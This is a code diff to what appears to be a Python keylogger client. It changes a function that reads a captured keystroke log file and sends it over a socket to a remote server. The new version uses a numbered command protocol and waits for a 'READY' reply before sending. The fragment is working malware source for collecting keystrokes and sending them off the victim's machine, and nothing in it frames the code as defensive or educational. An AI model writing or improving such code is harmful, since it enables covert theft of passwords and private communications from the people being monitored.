@@ -28,8 +28,15 @@ def start_keylogger(s):
 def send_log_to_server(log_file, s):
     with open(log_file, 'rb') as f:
         data = f.read()
-        s.sendall(f"LOGFILE|{os.path.basename(log_file)}|{len(data)}".encode())
-        s.sendall(data)
+        file_name = os.path.basename(log_file)
+        file_size = len(data)
+        s.sendall(f"5|{file_name}|{file_size}".encode())  # Use command 5 for file transfer
+        ack = s.recv(1024).decode()
+        if ack == "READY":
+            s.sendall(data)
+            print(f"Log file {file_name} sent to server.")
+        else:
+            print("Server not ready for file transfer.")
 
 # Client Code
 
